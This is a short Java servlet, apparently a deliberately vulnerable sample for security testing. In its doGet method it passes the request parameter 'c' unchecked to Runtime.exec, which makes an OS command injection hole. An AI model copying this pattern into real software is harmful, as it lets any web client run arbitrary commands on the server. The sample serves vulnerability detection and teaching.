import javax.servlet.http.*;
public class T extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws java.io.IOException {
    String mode = request.getParameter("m");
    String cmd = switch (mode) { case "a" -> "ls"; default -> request.getParameter("c"); };
    Runtime.getRuntime().exec(cmd);
  }
}
